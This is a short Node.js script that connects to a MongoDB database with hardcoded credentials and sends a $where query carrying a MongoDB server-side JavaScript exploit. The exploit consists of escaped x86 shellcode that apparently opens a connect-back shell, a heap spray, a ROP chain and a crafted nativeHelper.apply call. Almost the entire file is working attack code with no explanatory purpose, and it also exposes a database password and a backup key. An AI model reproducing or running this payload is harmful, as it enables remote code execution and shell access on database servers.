const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;

const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

//  app.use(session({
//    secret: 'the boundless tendency initiates the law.',
//    cookie: { maxAge: 3600000 },
//    resave: false,
//    saveUninitialized: false
//  }));

  db.collection('users').find({'$where':'shellcode=unescape("%u0a6a%u315e%uf7db%u53e3%u5343%u026a%u66b0%ue189%u80cd%u5b97%u0a68%u0e0a%u6807%u0002%ud204%ue189%u666a%u5058%u5751%ue189%ucd43%u8580%u79c0%u4e19%u3d74%ua268%u0000%u5800%u006a%u056a%ue389%uc931%u80cd%uc085%ubd79%u27eb%u07b2%u00b9%u0010%u8900%uc1e3%u0ceb%ue3c1%ub00c%ucd7d%u8580%u78c0%u5b10%ue189%ub299%ub024%ucd03%u8580%u78c0%uff02%ub8e1%u0001%u0000%u01bb%u0000%ucd00%u4180"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'})



});
